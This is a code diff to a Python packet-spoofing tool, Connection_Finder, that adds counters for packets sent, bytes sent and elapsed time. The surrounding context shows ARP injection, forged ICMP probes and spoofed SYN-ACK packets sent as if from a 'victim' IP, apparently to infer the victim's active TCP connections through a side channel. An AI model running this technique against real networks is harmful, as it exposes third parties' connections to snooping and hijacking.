@@ -60,6 +60,10 @@ class Connection_Finder:
         self.__stop = False
         self.result = -1
 
+        self.send_n = 0
+        self.send_byte = 0
+        self.cost_time = -1
+
         self.verbose = verbose
 
     def arp_inject(self):
@@ -94,6 +98,7 @@ class Connection_Finder:
 
     def check_new_list(self, list_p):
         C = len(list_p)
+        L = 0
         icmp_seq = random.randint(0, (1 << 16) - 1)
 
         send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
@@ -101,8 +106,13 @@ class Connection_Finder:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) / TCP(sport=p, dport=self.server_port, flags='SA'))
             send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
+        for pkg in send_list:
+            L += len(pkg)
+
         while True:
             self.__semaphore_ipid.acquire()
+            self.send_n += len(send_list)
+            self.send_byte += L
             pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=2, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
@@ -232,11 +242,15 @@ class Connection_Finder:
             time.sleep(1)
 
         t_e = time.time()
+        self.cost_time = t_e - t_s
+
         print('------ Connection Find ------')
         print('Forged IP: ' + self.forge_ip)
         print('Target Server: ' + self.server_ip + ':' + str(self.server_port))
         print('Target Victim: ' + self.victim_ip)
         print('Active Connection: ' + str(self.result))
+        print('Send Packets: ' + str(self.send_n))
+        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
         print('Cost Time: ' + str(t_e - t_s) + ' (s)')
 
         return t_e - t_s
